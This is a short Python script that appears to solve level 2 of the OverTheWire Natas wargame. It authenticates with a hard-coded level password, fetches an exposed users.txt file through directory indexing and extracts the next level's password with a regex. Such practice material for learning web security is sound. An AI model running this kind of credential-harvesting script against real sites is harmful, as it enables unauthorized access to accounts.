#directory indexing
import requests
import re

user="natas2"
password="h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7"
url='http://%s.natas.labs.overthewire.org' % user

response=requests.get(url + '/files/users.txt',auth=(user,password))
content=response.text
#print(content)
print (re.findall('natas3:(.*)',content)[0])